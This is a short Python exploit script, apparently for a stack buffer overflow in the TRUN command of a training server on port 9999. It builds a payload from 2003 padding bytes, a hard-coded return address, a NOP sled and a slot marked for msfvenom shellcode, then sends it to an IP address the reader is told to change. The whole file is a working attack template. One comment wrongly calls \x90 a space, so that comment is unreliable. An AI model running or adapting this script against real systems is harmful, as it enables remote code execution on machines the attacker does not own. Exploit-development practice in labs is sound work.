import socket
import sys

#Result Note 625011af

overflow = ("MSFVENOM PAYLOAD")

stringToSend = "TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow ## ---> x90 is a space. < 400 byte

try:

    Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    Socket.connect(("10.10.10.10", 9999)) ## ---> Change IP Address and port

    bytes = stringToSend.encode(encoding = "latin1") ## ---> You can change latin1
        
    Socket.send(bytes)

    Socket.close()

except Exception as Error:

    print(Error)

    sys.exit()



